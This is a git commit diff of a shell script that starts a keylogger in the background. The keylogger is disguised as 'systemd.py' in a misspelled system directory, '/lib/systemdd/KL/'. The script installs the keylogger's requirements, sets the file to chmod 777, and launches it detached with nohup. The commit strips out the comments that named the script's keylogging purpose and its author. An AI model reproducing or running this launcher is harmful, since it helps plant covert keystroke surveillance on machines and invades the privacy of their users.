667e4f6d6a6cc19564f9292e847a2736eab63890
quanfbi2003 <48565257+quanfbi2003@users.noreply.github.com>
2022-12-13 13:53:43 +0700

    update

--- start/initiate.sh
+++ start/initiate.sh
@@ -1,17 +1,11 @@
-##This start script is a free software
-##Developed by Joshia Rheinier
-##The purpose of this script is to run the keylogger on background
-
-
-#Put your keylogger script along with its full directory here
 DIR="/lib/systemdd/KL/"
 FILE="systemd.py"
 REQ="requirements.txt"
 
 #Make the program be able to be executed
-chmod +x $DIR$FILE
+chmod 777 $DIR$FILE
 #Execute the program with Python 3, and
 #put the process in background with
 #nohup command
 pip3 install -r $DIR$REQ
-nohup python3 $DIR$FILE &> no-output&
+nohup python3 $DIR$FILE > nohup.out &
